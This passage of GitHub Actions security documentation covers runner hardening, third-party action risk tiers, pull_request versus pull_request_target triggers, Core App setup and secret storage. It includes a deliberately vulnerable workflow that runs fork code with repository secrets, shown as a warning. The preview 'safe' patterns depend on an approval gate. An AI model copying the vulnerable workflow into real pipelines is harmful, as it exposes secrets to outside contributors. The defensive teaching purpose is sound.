- T+30m: Workflow completes, PR closed, reconnaissance data sent to attacker
- T+48h: Targeted phishing campaign against internal teams using reconnaissance data

**Impact**: Network topology disclosure. Internal service discovery. Reconnaissance for future attacks.

**Prevention**: Network segmentation. Runner networks isolated from production systems. Egress filtering. Deny-by-default firewall rules.

#### Security Principles for Self-Hosted Runners

##### Principle 1: Ephemeral Execution

**Never reuse runner state between jobs.**

Every job executes in a fresh environment (VM or container). Filesystem, network identity, and credentials start clean. Malicious job cannot plant persistence for future exploitation.

**Implementation**: Actions Runner Controller (ARC) with ephemeral mode, VM autoscaling groups with per-job lifecycle, container-based runners with destroy-on-completion.

##### Principle 2: Network Isolation

**Runners should not have default access to production systems.**

Deploy runners in isolated network segments with explicit allow-lists for required internal services. Deny-by-default firewall rules. Egress filtering to prevent exfiltration.

**Implementation**: VPC/VNet segmentation, subnet-level network policies, deny-all egress with explicit allow rules for GitHub API and package registries.

##### Principle 3: Minimal Credential Scope

**Runners receive only credentials required for specific jobs.**

No ambient credentials. No long-lived tokens. Use OIDC federation to mint short-lived credentials per job. Cloud IAM policies scoped to minimal required permissions.

**Implementation**: OIDC trust policies with subject claim validation, per-job temporary credentials, metadata endpoint blocking, runner-specific IAM roles.

##### Principle 4: Audit Logging and Monitoring

**Every runner action is logged and monitored.**

Capture job execution logs, network connections, credential access, and system calls. Alert on anomalous behavior (unusual network destinations, metadata queries, privileged operations).

**Implementation**: Centralized log aggregation, CloudWatch/Stackdriver for cloud events, auditd for system calls, network flow logs, anomaly detection.

##### Principle 5: Least Privilege Runner Groups

**Organize runners by trust level and scope.**

Separate runner groups for public repositories (untrusted) vs internal repositories (trusted). Different groups for production vs non-production workloads. Repository access restrictions per group.

**Implementation**: GitHub runner groups with repository allow-lists, workflow restrictions, required labels for sensitive runners.

#### Quick Reference: Runner Security Checklist

Use this checklist when deploying or auditing self-hosted runners.

##### Deployment Security

- [ ] Runners are ephemeral (fresh state per job)
- [ ] Network isolation from production systems
- [ ] Deny-by-default firewall rules
- [ ] Egress filtering configured
- [ ] No access to cloud metadata endpoints (or IMDSv2 enforced)
- [ ] Minimal IAM permissions scoped to runner needs
- [ ] OS hardening applied (CIS benchmarks)
- [ ] Runner software auto-updates enabled
- [ ] Dedicated runner groups for public vs private repos
- [ ] Repository access restrictions configured

##### Runtime Security

- [ ] Jobs execute as non-root user
- [ ] No privileged container mode
- [ ] Filesystem isolation between jobs
- [ ] Temporary credentials only (no long-lived tokens)
- [ ] Secret injection via environment variables (not filesystem)
- [ ] Audit logging enabled and monitored
- [ ] Network connections logged and analyzed
- [ ] Anomaly detection configured for unusual behavior

##### Operational Security

- [ ] Runner registration tokens rotated regularly
- [ ] Automated vulnerability scanning of runner images
- [ ] Incident response plan for runner compromise
- [ ] Regular review of runner access logs
- [ ] Decommission runners when no longer needed
- [ ] Monitor for unauthorized runner registration
- [ ] Alert on runner configuration changes
- [ ] Periodic penetration testing of runner infrastructure

#### Next Steps

- **[Hardening Checklist](hardening/index.md)**: Comprehensive OS and runtime hardening steps
- **[Ephemeral Runners](ephemeral/index.md)**: Deployment patterns for VM and container-based ephemeral runners
- **[Runner Groups](groups/index.md)**: Organizing runners by trust level and security requirements

#### Related Documentation

- [Secret Management Overview](../secrets/secrets-management/index.md): Securing credentials for runner access
- [OIDC Federation](../secrets/oidc/index.md): Secretless authentication from runners to cloud providers
- [Third-Party Action Risk Assessment](../third-party-actions/index.md): Evaluating actions that execute on runners
- [Workflow Triggers](../workflows/triggers/index.md): Understanding which events trigger runner execution

### Third-Party Action Risk Assessment

Trust but verify. Every third-party action you adopt into your workflows executes with access to your secrets, code, and deployment infrastructure. Know what you're trusting.

> **The Risk**
>
>
> Third-party actions run arbitrary code inside your CI/CD pipeline with full access to repository secrets, cloud credentials, and source code. A malicious or compromised action can exfiltrate everything, deploy backdoors, or modify your codebase.
>

#### Why Risk Assessment Matters

GitHub Actions makes it trivial to import third-party code into your workflows. One line in a YAML file grants that action execution privileges in your environment. Without risk assessment, you're blind to:

1. **Who controls the action**: Individual developer? Corporate team? Unknown entity?
2. **Security posture of maintainer**: 2FA enabled? Org controls? Security team?
3. **Code quality and review**: Is source readable? Are dependencies safe? Active maintenance?
4. **Permission requirements**: What API scopes does it request? Are they justified?
5. **Historical security**: Past vulnerabilities? Disclosure process? Incident response?

**Reality**: Most teams add actions based on README quality and star count, not security analysis.

#### The Third-Party Action Attack Surface

```mermaid
flowchart TD
    A["Third-Party Action"] --> B["Execution Context"]

    B --> C["Secrets Access"]
    B --> D["Code Access"]
    B --> E["Token Permissions"]

    C --> C1["GITHUB_TOKEN"]
    C --> C2["Cloud Credentials"]
    C --> C3["API Keys"]
    C --> C4["Deployment Tokens"]

    D --> D1["Source Code"]
    D --> D2["Git History"]
    D --> D3["Dependencies"]

    E --> E1["Write to Repo"]
    E --> E2["Create Releases"]
    E --> E3["Modify Workflows"]

    C1 --> F["Attack Vectors"]
    C2 --> F
    C3 --> F
    D1 --> F
    E3 --> F

    F --> G["Exfiltrate Secrets"]
    F --> H["Backdoor Codebase"]
    F --> I["Persistent Access"]
    F --> J["Supply Chain Compromise"]

    %% Ghostty Hardcore Theme
    style A fill:#f92572,color:#1b1d1e
    style B fill:#fd971e,color:#1b1d1e
    style F fill:#e6db74,color:#1b1d1e
    style G fill:#66d9ef,color:#1b1d1e
    style H fill:#66d9ef,color:#1b1d1e
    style I fill:#66d9ef,color:#1b1d1e
    style J fill:#66d9ef,color:#1b1d1e

```

#### Trust Tier Framework

Classify actions based on maintainer trustworthiness and security posture. Higher trust allows faster adoption. Lower trust requires deeper scrutiny.

##### Tier 1: GitHub-Maintained Actions

**Examples**: `actions/checkout`, `actions/setup-node`, `actions/upload-artifact`, `actions/cache`, `github/codeql-action`

**Characteristics**:

- Published under `actions/*` or `github/*` namespaces
- Maintained by GitHub's internal teams
- Subject to GitHub's security review processes
- High-quality documentation and support
- Broad usage across millions of workflows

**Risk Level**: **Low**

**Adoption Process**:

1. SHA pin the action
2. Review changelog for new version
3. Standard PR review process
4. No additional security review required

**Recommendation**: Safe for general use. Still SHA pin to prevent tag mutation attacks.

##### Tier 2: Verified Publisher Actions

**Examples**: `aws-actions/configure-aws-credentials`, `azure/login`, `google-github-actions/auth`, `docker/build-push-action`

**Characteristics**:

- Published by verified organizations (AWS, Azure, Google, Docker, etc.)
- Blue checkmark badge on GitHub Marketplace
- Corporate security teams responsible for maintenance
- Active development and security disclosure processes
- Widely adopted in enterprise environments

**Risk Level**: **Medium**

**Adoption Process**:

1. Verify publisher badge on GitHub Marketplace
2. Review action source code in repository
3. Check for active maintenance (recent commits, issue responses)
4. Review permission requirements
5. SHA pin the action
6. Security team approval for first use
7. Standard PR review for version updates

**Recommendation**: Generally safe with review. Require security sign-off for initial adoption.

##### Tier 3: Community Actions

**Examples**: Individual developers, small teams, niche tools without verified publisher status

**Characteristics**:

- No verified publisher badge
- Maintained by individuals or small organizations
- Variable security posture and maintenance cadence
- May have limited documentation or support
- Unknown incident response capability

**Risk Level**: **High**

**Adoption Process**:

1. **Maintainer Review**: GitHub profile, 2FA status, other repositories, professional affiliation
2. **Code Review**: Full source audit, dependency review, suspicious patterns, build reproducibility
3. **Maintenance Assessment**: Last commit date, issue response, security policy, release cadence
4. **Permission Analysis**: Document requirements, verify justification, identify excessive scope
5. **Alternative Evaluation**: Can we build this? Are there Tier 1/2 alternatives? Fork internally?
6. **Security Approval**: Security team mandatory review, risk acceptance, monitoring plan
7. **Ongoing Monitoring**: Dependabot alerts, quarterly re-review, maintainer changes

**Recommendation**: High scrutiny. Prefer forking and internal maintenance for critical workflows.

See [Evaluation Criteria](evaluation.md) for detailed assessment process.

##### Tier 4: Unknown/Unvetted Actions

**Examples**: Recently created actions, actions with minimal usage, suspicious patterns

**Characteristics**:

- New repository (< 6 months old)
- Low star count and minimal forks
- No clear maintainer identity
- Sparse documentation
- Requests excessive permissions
- Similar name to popular action (typosquatting)

**Risk Level**: **Critical**

**Adoption Process**:

1. **Block by default**: Use organization allowlist to prevent usage
2. **Thorough investigation**: If business need is compelling, treat as Tier 3 with additional scrutiny
3. **Build alternative**: Strongly prefer building internally or finding Tier 1/2 alternative
4. **Fork and audit**: If must use, fork to internal org, full security audit, maintain internally

**Recommendation**: Avoid. Block via organizational policies.

#### Risk Assessment Checklist

Use this checklist before adopting any third-party action.

##### Maintainer Trust

- [ ] Verified publisher badge (Tier 2) or GitHub-maintained namespace (Tier 1)?
- [ ] Active GitHub profile with real identity indicators?
- [ ] Organization affiliated or individual developer?
- [ ] 2FA enabled on maintainer account?
- [ ] Professional reputation verifiable?

##### Repository Health

- [ ] Repository has > 100 stars and > 10 forks?
- [ ] Active maintenance (commits within last 3 months)?
- [ ] Issues responded to promptly (< 1 week average)?
- [ ] Release notes document changes clearly?
- [ ] Security policy documented (`SECURITY.md` exists)?

##### Code Quality

- [ ] Source code is readable and understandable?
- [ ] Dependencies are minimal and from trusted sources?
- [ ] No obfuscated code or suspicious patterns?
- [ ] Build process is transparent and reproducible?
- [ ] Tests exist and pass?

##### Security Posture

- [ ] Action source code audited for malicious behavior?
- [ ] Requested permissions are minimal and justified?
- [ ] No hardcoded credentials or secrets?
- [ ] Network calls are documented and necessary?
- [ ] Past vulnerabilities handled responsibly?

##### Operational Risk

- [ ] Dependabot can monitor for updates?
- [ ] Forking action is feasible if maintainer disappears?
- [ ] Organization has process for removing action if needed?
- [ ] Alternative actions exist (no vendor lock-in)?
- [ ] Team has skills to maintain fork if required?

##### Documentation Quality

- [ ] README explains what action does clearly?
- [ ] Input/output parameters documented?
- [ ] Example workflows provided?
- [ ] Permission requirements explained?
- [ ] Security considerations mentioned?

#### Decision Tree for Action Adoption

```mermaid
flowchart TD
    Start["New Action Needed"] --> Q1{"GitHub-Maintained<br/>(actions/*, github/*)?"}

    Q1 -->|Yes| Tier1["Tier 1: Low Risk"]
    Q1 -->|No| Q2{"Verified Publisher?"}

    Q2 -->|Yes| Tier2["Tier 2: Medium Risk"]
    Q2 -->|No| Q3{"Community Action<br/>with Good Signals?"}

    Q3 -->|Yes| Tier3["Tier 3: High Risk"]
    Q3 -->|No| Tier4["Tier 4: Critical Risk"]

    Tier1 --> A1["✓ SHA Pin<br/>✓ PR Review<br/>✓ Adopt"]

    Tier2 --> A2["✓ Source Review<br/>✓ Security Approval<br/>✓ SHA Pin<br/>✓ Adopt"]

    Tier3 --> A3["✓ Full Code Audit<br/>✓ Risk Assessment<br/>✓ Alternatives Evaluated"]
    A3 --> Q4{"Risk Acceptable?"}
    Q4 -->|Yes| A4["✓ Security Sign-Off<br/>✓ Monitoring Plan<br/>✓ Fork & Maintain"]
    Q4 -->|No| Reject["❌ Reject - Build Internal"]

    Tier4 --> A5["⚠ Block by Default"]
    A5 --> Q5{"Compelling Business Need?"}
    Q5 -->|Yes| A6["✓ Treat as Tier 3<br/>✓ Enhanced Scrutiny<br/>✓ Fork Required"]
    Q5 -->|No| Reject

    %% Ghostty Hardcore Theme
    style Start fill:#66d9ef,color:#1b1d1e
    style Tier1 fill:#a6e22e,color:#1b1d1e
    style Tier2 fill:#e6db74,color:#1b1d1e
    style Tier3 fill:#fd971e,color:#1b1d1e
    style Tier4 fill:#f92572,color:#1b1d1e
    style Reject fill:#f92572,color:#1b1d1e
    style A1 fill:#a6e22e,color:#1b1d1e
    style A4 fill:#e6db74,color:#1b1d1e

```

#### Security Best Practices

**Always SHA pin third-party actions**: Tag references can be mutated. SHA pins are immutable.

```yaml
### Bad - tag reference
- uses: community/action@v2

### Good - SHA pinned with version comment
- uses: community/action@a1b2c3d4e5f6...  # v2.1.0
```

**Review action source code before first use**: Never trust based on stars or README alone. Read the actual implementation.

**Fork critical actions to organization control**: Removes dependency on external maintainer. Gives you control over updates.

**Monitor for action updates**: Use Dependabot to track new versions. Review changelogs before updating.

**Minimize permissions**: Grant actions only what they need. Use job-level scoping to limit scope.

**Isolate high-risk workflows**: Run untrusted actions in separate jobs with minimal permissions and no secret access.

**Audit action usage quarterly**: Review which actions are in use. Re-assess risk as threat landscape evolves.

**Have an exit strategy**: Know how to replace or remove every action if it becomes compromised or unmaintained.

#### Next Steps

Ready to implement action risk assessment? Continue with:

- **[Evaluation Criteria](evaluation.md)**: Detailed criteria and scoring system for action security review with step-by-step audit process
- **[Common Actions Review](common-actions.md)**: Pre-reviewed security assessment of frequently-used actions with known issues and safe usage patterns
- **[Allowlisting Guide](allowlisting.md)**: Step-by-step setup for organizational action policies, approval workflows, and enforcement mechanisms

#### Quick Reference

##### Trust Tiers

| Trust Tier | Risk Level | Adoption Process | Examples |
| ---------- | ---------- | ---------------- | -------- |
| **Tier 1: GitHub-Maintained** | Low | SHA pin + standard review | `actions/*`, `github/*` |
| **Tier 2: Verified Publishers** | Medium | Source review + security approval | `aws-actions/*`, `azure/*`, `google-github-actions/*` |
| **Tier 3: Community** | High | Full audit + fork + monitoring | Individual developers, small teams |
| **Tier 4: Unknown/Unvetted** | Critical | Block or treat as Tier 3+ | New repos, typosquatting, excessive permissions |

##### Risk Assessment Quick Check

| Question | Safe Answer | Risk Answer |
| -------- | ----------- | ----------- |
| Verified publisher? | Yes | No |
| Active maintenance (< 3 months)? | Yes | No |
| Source code reviewed? | Yes | No |
| Minimal permissions requested? | Yes | No |
| Security policy documented? | Yes | No |
| Dependencies audited? | Yes | No |
| Fork feasible? | Yes | No |
| Alternatives exist? | Yes | No |

**If 6+ "Risk" answers**: Reject or require extensive mitigation before adoption.

---

> **Default to Distrust**
>
>
> Treat every third-party action as untrusted until proven otherwise. Even verified publishers can be compromised. SHA pin everything, review all source code for critical workflows, and maintain forks of essential actions under your organization's control.
>

### Workflow Trigger Security

Workflow triggers control when code executes and in what security context. Choose the wrong trigger and attackers can inject code, escalate privileges, or exfiltrate secrets from forks.

> **The Risk**
>
>
> Trigger misconfiguration is the leading cause of GitHub Actions privilege escalation. `pull_request_target` runs fork code in the base repository context with full secret access. External contributors can weaponize this to steal credentials, push malicious code, or compromise your infrastructure.
>

#### The Trigger Security Model

GitHub Actions triggers fall into three security categories based on execution context and secret access.

```mermaid
flowchart TD
    A["Workflow Trigger"] --> B{"Execution<br/>Context?"}

    B -->|Fork Context| C["pull_request"]
    B -->|Base Context| D["pull_request_target"]
    B -->|Trusted Only| E["push / workflow_dispatch"]

    C --> C1["Runs: Fork HEAD"]
    C --> C2["Secrets: None"]
    C --> C3["GITHUB_TOKEN: Read-only"]
    C --> C4["Risk: Low"]

    D --> D1["Runs: Base Branch"]
    D --> D2["Secrets: Full Access"]
    D --> D3["GITHUB_TOKEN: Write"]
    D --> D4["Risk: HIGH"]

    E --> E1["Runs: Trusted Code"]
    E --> E2["Secrets: Full Access"]
    E --> E3["GITHUB_TOKEN: Configured"]
    E --> E4["Risk: Medium"]

    C4 --> F["Safe for fork PRs"]
    D4 --> G["Requires explicit checkout<br/>and approval gates"]
    E4 --> H["Safe for trusted branches"]

    %% Ghostty Hardcore Theme
    style A fill:#66d9ef,color:#1b1d1e
    style B fill:#e6db74,color:#1b1d1e
    style C fill:#a6e22e,color:#1b1d1e
    style D fill:#f92572,color:#1b1d1e
    style E fill:#fd971e,color:#1b1d1e
    style C4 fill:#a6e22e,color:#1b1d1e
    style D4 fill:#f92572,color:#1b1d1e
    style E4 fill:#fd971e,color:#1b1d1e

```

#### `pull_request` vs `pull_request_target`

Understanding the difference between these triggers is critical for fork security.

##### `pull_request` Trigger

**Security Context**: Runs in fork's security context

**Code Executed**: From pull request HEAD

**Secret Access**: None

**GITHUB_TOKEN Permissions**: Read-only by default

**Safe For**: Public repositories accepting fork contributions

**Use Cases**: Testing, linting, build verification, security scanning

**Example Safe Fork CI**:

```yaml
name: Fork CI
on:
  pull_request:
    branches: [main]

permissions:
  contents: read  # Explicit read-only

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
##      # Safe: Checkout fork PR code in isolated context
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1

##      # Safe: No secrets, runs untrusted code
      - name: Run tests
        run: npm test

##      # Safe: Read-only token cannot modify repository
      - name: Verify build
        run: npm run build
```

**Why This Is Safe**:

1. Fork code runs in isolated context
2. No access to repository secrets
3. GITHUB_TOKEN is read-only
4. Cannot push code or modify releases
5. Cannot access organization resources

##### `pull_request_target` Trigger

**Security Context**: Runs in base repository context

**Code Executed**: From base branch, NOT pull request code

**Secret Access**: Full repository and organization secrets

**GITHUB_TOKEN Permissions**: Write by default

**Dangerous For**: Any workflow that checks out or executes PR code

**Valid Use Cases**: Commenting on PRs, labeling PRs, triggering external systems, publishing previews after approval

**Example DANGEROUS Pattern**:

```yaml
### DO NOT USE THIS PATTERN - SEVERE SECURITY RISK
name: Dangerous PR Target
on:
  pull_request_target:  # Base context with secrets
    branches: [main]

jobs:
  deploy-preview:
    runs-on: ubuntu-latest
    steps:
##      # DANGER: Checks out fork code in base context with secrets
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
        with:
          ref: ${{ github.event.pull_request.head.sha }}

##      # DANGER: Executes fork code with full secret access
      - run: npm run deploy-preview
        env:
          AWS_SECRET: ${{ secrets.AWS_SECRET }}
```

**Why This Is Dangerous**:

1. Fork code executes in base repository security context
2. Full access to all secrets
3. GITHUB_TOKEN has write permissions by default
4. Attacker can exfiltrate credentials in malicious `package.json` scripts
5. Attacker can push code, create releases, or modify workflows

**Example Safe Pattern with Approval**:

```yaml
name: Safe PR Target with Approval
on:
  pull_request_target:
    branches: [main]

permissions:
  pull-requests: write  # Only PR comments
  contents: read        # No repository modification

jobs:
  deploy-preview:
    runs-on: ubuntu-latest
    environment: pr-previews
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
        with:
          ref: ${{ github.event.pull_request.head.sha }}

      - uses: google-github-actions/auth@55bd3a7c6e2ae7cf1877fd1ccb9d54c0503c457c  # v2.1.2
        with:
          workload_identity_provider: ${{ secrets.WIF_PROVIDER }}
          service_account: ${{ secrets.WIF_SERVICE_ACCOUNT }}

      - run: npm run deploy-preview
```

**Safe Pattern Requirements**:

1. Minimal permissions (no `contents: write`)
2. Environment protection with required reviewers
3. OIDC authentication instead of stored secrets
4. Explicit checkout only after approval gate
5. Audit logging for all preview deployments

##### Trigger Comparison Table

| Aspect | `pull_request` | `pull_request_target` |
| ------ | -------------- | --------------------- |
| **Execution Context** | Fork HEAD | Base branch |
| **Secret Access** | None | Full access |
| **GITHUB_TOKEN** | Read-only | Write |
| **Use Case** | Test fork PRs | Comment on PRs |
| **Risk Level** | Low | High |
| **Safe for Forks** | Yes | Only with approval |

#### Fork Workflow Security Patterns

##### Pattern 1: Two-Stage Fork CI

Separate untrusted fork testing from privileged operations.

```yaml
### Stage 1: Test fork code with pull_request
name: Fork Tests
on:
  pull_request:
    branches: [main]

permissions:
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
      - run: npm test
```

```yaml
### Stage 2: Post results with workflow_run
name: Post Test Results
on:
  workflow_run:
    workflows: ["Fork Tests"]
    types: [completed]

permissions:
  pull-requests: write
  contents: read

jobs:
  comment:
    runs-on: ubuntu-latest
    if: github.event.workflow_run.event == 'pull_request'
    steps:
      - uses: actions/github-script@60a0d83039c74a4aee543508d2ffcb1c3799cdea  # v7.0.1
        with:
          script: |
            await github.rest.issues.createComment({
              issue_number: ${{ github.event.workflow_run.pull_requests[0].number }},
              owner: context.repo.owner,
              repo: context.repo.repo,
              body: 'Tests completed. Check workflow run for results.'
            });
```

Stage 1 runs untrusted code without secrets. Stage 2 runs trusted code with write permissions. The `workflow_run` trigger bridges the security boundary.

##### Pattern 2: Approval Gate for Fork Deployments

Require manual approval before deploying fork code.

```yaml
name: Preview Deployment
on:
  pull_request_target:
    branches: [main]

permissions:
  contents: read
  pull-requests: write

jobs:
  deploy-preview:
    runs-on: ubuntu-latest
    environment: pr-previews
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
        with:
          ref: ${{ github.event.pull_request.head.sha }}

      - uses: google-github-actions/auth@55bd3a7c6e2ae7cf1877fd1ccb9d54c0503c457c  # v2.1.2
        with:
          workload_identity_provider: ${{ secrets.WIF_PROVIDER }}
          service_account: ${{ secrets.WIF_SERVICE_ACCOUNT }}

      - run: npm run deploy-preview
```

Configure the `pr-previews` environment in Settings → Environments with required reviewers and deployment branch restrictions.

##### Pattern 3: Fork PR Security Validation

```yaml
name: Fork Security Scan
on:

## GitHub Core App Setup

Configure organization-level GitHub Apps for secure…

This guide describes the concept, setup, and configuration of a GitHub Core App for organization-level automation.

#### What is a GitHub Core App?

> **Definition**
>
>
> A **GitHub Core App** is an organization-level GitHub App that provides centralized, secure authentication for GitHub Actions workflows operating across multiple repositories. It serves as the foundational authentication mechanism for org-wide automation.
>

##### Why Use a Core App?

> **Core App Approach**
>
>
> - Organization-owned identity independent of individuals
> - Survives personnel changes
> - Complete audit trail of all actions
> - Fine-grained, repository-scoped permissions
> - Higher rate limits (5000 requests/hour per installation)
> - Team-based repository access control
>

##### Use Cases

A GitHub Core App enables:

- **Cross-repository operations** - Synchronize files across multiple repositories
- **Team-scoped automation** - Query and operate on team repositories
- **Centralized CI/CD** - Single authentication source for all workflows
- **Compliance automation** - Enforce policies across organization
- **Repository management** - Create, configure, and manage repositories programmatically

#### Core App vs. Standard GitHub Apps

| Aspect | Core App | Standard App |
| -------- | ---------- | -------------- |
| **Scope** | Organization-wide | Single repository or selected repos |
| **Purpose** | Infrastructure automation | Feature-specific functionality |
| **Permissions** | Broad, covers common operations | Narrow, task-specific |
| **Installation** | All repositories | Selective repositories |
| **Ownership** | Organization-level admin | Project or team |
| **Lifespan** | Permanent infrastructure | Project lifecycle |

#### Prerequisites

##### Required Access

> **Required Access**
>
>
> To create a Core App, you need:
>
> - **Organization owner** role
> - Access to organization settings: `https://github.com/organizations/{ORG}/settings/apps`
>

##### Planning Considerations

> **Planning Considerations**
>
>
> Before creating the app, determine:
>
> 1. **Permission scope** - Which repository and organization permissions are needed
> 2. **Installation scope** - All repositories or specific teams
> 3. **Token management** - Where secrets will be stored (repository or organization level)
> 4. **Naming convention** - Standard naming (e.g., "CORE App", "Automation Core")
>

#### Guide Sections

- [Authentication Decision Guide](authentication-decision-guide.md) - Choose between JWT, installation tokens, and OAuth
- [Creating the Core App](creating-the-app.md) - Step-by-step app creation and configuration
- [Storing Credentials](storing-credentials/index.md) - Managing secrets in GitHub
- [Permission Patterns](permission-patterns.md) - Common permission configurations
- [Security Best Practices](security-best-practices.md) - Securing your Core App
- [Installation Scopes](installation-scopes.md) - Choosing the right installation scope
- [Common Permissions](common-permissions.md) - Permission requirements by use case
- [Troubleshooting](troubleshooting.md) - Common issues and solutions
- [Maintenance](maintenance.md) - Ongoing care and key rotation

#### Next Steps

After setting up your Core App:

1. **[GitHub Actions Integration](../../patterns/github-actions/actions-integration/index.md)** - Learn how to use the app in workflows
2. **[Distribution Workflows](../../patterns/github-actions/use-cases/file-distribution/index.md)** - Example use case patterns

#### References

- [GitHub Apps Documentation](https://docs.github.com/en/apps)
- [GitHub Apps Permissions](https://docs.github.com/en/rest/overview/permissions-required-for-github-apps)
- [GitHub GraphQL API](https://docs.github.com/en/graphql)
- [Organization Security Best Practices](https://docs.github.com/en/organizations/keeping-your-organization-secure)

### Storing Credentials

Comprehensive guide to securely storing GitHub App credentials across different environments and platforms.

> **Storage Environment Decision**
>
>
> - **GitHub Actions** - Native GitHub Secrets (recommended for GitHub-hosted workflows)
> - **External CI** - Platform-specific secret management (Jenkins, GitLab CI, CircleCI)
> - **Kubernetes** - External Secrets Operator or Sealed Secrets
> - **Local Development** - Environment variables or encrypted vaults (never in code)
>

#### Storage Decision Tree

```mermaid
flowchart TD
    A["Where will credentials be used?"] --> B{"Execution<br/>environment?"}

    B -->|"GitHub Actions"| C["GitHub Secrets"]
    B -->|"External CI/CD"| D["Platform Secrets Manager"]
    B -->|"Kubernetes"| E["External Secrets Operator"]
    B -->|"Local Development"| F["Environment Variables<br/>+ Encrypted Vault"]

    C --> C1["Organization secrets<br/>(recommended)"]
    C --> C2["Repository secrets<br/>(single repo)"]
    C --> C3["Environment secrets<br/>(protected workflows)"]

    D --> D1["Jenkins Credentials"]
    D --> D2["GitLab CI Variables"]
    D --> D3["CircleCI Contexts"]

    E --> E1["AWS Secrets Manager"]
    E --> E2["HashiCorp Vault"]
    E --> E3["Google Secret Manager"]

    %% Ghostty Hardcore Theme
    style A fill:#515354,stroke:#ccccc7,stroke-width:2px,color:#ccccc7
    style B fill:#fd971e,stroke:#e6db74,stroke-width:2px,color:#1b1d1e
    style C fill:#a7e22e,stroke:#bded5f,stroke-width:2px,color:#1b1d1e
    style D fill:#65d9ef,stroke:#a3babf,stroke-width:2px,color:#1b1d1e
    style E fill:#9e6ffe,stroke:#9e6ffe,stroke-width:2px,color:#1b1d1e
    style F fill:#f92572,stroke:#ff669d,stroke-width:2px,color:#1b1d1e
    style C1 fill:#515354,stroke:#ccccc7,stroke-width:1px,color:#ccccc7
    style C2 fill:#515354,stroke:#ccccc7,stroke-width:1px,color:#ccccc7
    style C3 fill:#515354,stroke:#ccccc7,stroke-width:1px,color:#ccccc7
    style D1 fill:#515354,stroke:#ccccc7,stroke-width:1px,color:#ccccc7
    style D2 fill:#515354,stroke:#ccccc7,stroke-width:1px,color:#ccccc7
    style D3 fill:#515354,stroke:#ccccc7,stroke-width:1px,color:#ccccc7
    style E1 fill:#515354,stroke:#ccccc7,stroke-width:1px,color:#ccccc7
    style E2 fill:#515354,stroke:#ccccc7,stroke-width:1px,color:#ccccc7
    style E3 fill:#515354,stroke:#ccccc7,stroke-width:1px,color:#ccccc7
```

#### GitHub Actions Secrets

##### Repository Secrets

For single-repository usage:

1. Navigate to repository **Settings**
2. Go to **Secrets and variables** → **Actions**
3. Click **New repository secret**
4. Add two secrets:
   - `CORE_APP_ID`: Numeric app ID
   - `CORE_APP_PRIVATE_KEY`: Complete `.pem` file contents

> **When to Use Repository Secrets**
>
>
> - Single repository workflows
> - Repository-specific GitHub Apps
> - Testing and development environments
> - Isolated security boundaries
>

##### Organization Secrets

For organization-wide usage (recommended):

1. Navigate to **Organization Settings**
2. Go to **Secrets and variables** → **Actions**
3. Click **New organization secret**
4. Add secrets with same names as above
5. Configure **Repository access**:
   - **All repositories** - Available to all org repos
   - **Selected repositories** - Choose specific repos
   - **Private repositories only** - Additional security layer

> **Advantages of Organization Secrets**
>
>
> - **Single source of truth** - One credential set for all repositories
> - **Centralized rotation** - Update once, applies everywhere
> - **Consistent naming** - Same secret names across org
> - **Simplified auditing** - Track usage from one location
>

##### Environment Secrets

For additional security with protected workflows:

1. Create an environment (e.g., `production`, `staging`)
2. Add secrets to the environment
3. Configure protection rules:
   - **Required reviewers** - Manual approval before access
   - **Wait timer** - Delay before secret access
   - **Deployment branches** - Restrict to specific branches
   - **Environment-specific values** - Different credentials per environment

```yaml
jobs:
  deploy:
    environment: production
    steps:
      - name: Generate token
        uses: actions/create-github-app-token@v1
        with:
          app-id: ${{ secrets.CORE_APP_ID }}
          private-key: ${{ secrets.CORE_APP_PRIVATE_KEY }}
```

> **Environment Protection Use Cases**
>
>
> - Production deployments requiring approval
> - Sensitive operations (database migrations, infrastructure changes)
> - Compliance requirements for change control
> - Multi-environment workflows (dev, staging, prod)
>

##### Secret Naming Conventions

| Secret Name | Contents | Example | Scope |
| ------------- | ---------- | --------- | ------- |
| `CORE_APP_ID` | Numeric app ID | `123456` | All environments |
| `CORE_APP_PRIVATE_KEY` | Complete PEM file contents | `-----BEGIN RSA PRIVATE KEY-----...` | All environments |
| `PROD_APP_ID` | Production-specific app ID | `789012` | Environment-specific |
| `PROD_APP_PRIVATE_KEY` | Production private key | `-----BEGIN RSA PRIVATE KEY-----...` | Environment-specific |

> **Naming Best Practices**
>
>
> - Use `CORE_APP_*` prefix for organization-wide apps
> - Use environment prefixes (`PROD_`, `STAGING_`) for environment-specific credentials
> - Avoid ambiguous names like `APP_ID` or `PRIVATE_KEY`
> - Document naming conventions in your organization's security policy
>

##### Repository vs Organization vs Environment Secrets

| Aspect | Repository Secrets | Organization Secrets | Environment Secrets |
| -------- | ------------------- | --------------------- | --------------------- |
| **Scope** | Single repository | Multiple repositories | Specific environment |
| **Management** | Per-repo updates | Centralized updates | Per-environment updates |
| **Rotation** | Update each repo | Update once | Update per environment |
| **Access Control** | Repository admins | Organization admins | Environment reviewers |
| **Protection** | Workflow-level | Repository selection | Approval + branch rules |
| **Use Case** | Isolated repos | Organization-wide automation | Production deployments |
| **Auditing** | Repository audit log | Organization audit log | Environment deployment log |

##### Workflow Access Patterns

###### Basic Token Generation

```yaml
- name: Generate token
  id: app-token
  uses: actions/create-github-app-token@v2
  with:
    app-id: ${{ secrets.CORE_APP_ID }}
    private-key: ${{ secrets.CORE_APP_PRIVATE_KEY }}

- name: Use token
  env:
    GITHUB_TOKEN: ${{ steps.app-token.outputs.token }}
  run: |
    gh api /repos/${{ github.repository }}/issues
```

###### Organization-Scoped Token

```yaml
- name: Generate org-scoped token
  uses: actions/create-github-app-token@v2
  with:
    app-id: ${{ secrets.CORE_APP_ID }}
    private-key: ${{ secrets.CORE_APP_PRIVATE_KEY }}
    owner: my-organization
```

###### Multi-Repository Token

```yaml
- name: Generate multi-repo token
  uses: actions/create-github-app-token@v2
  with:
    app-id: ${{ secrets.CORE_APP_ID }}
    private-key: ${{ secrets.CORE_APP_PRIVATE_KEY }}
    repositories: |
      repo-one
      repo-two
      repo-three
```

## Go Security Tooling

Standard Go security toolkit: race detector…

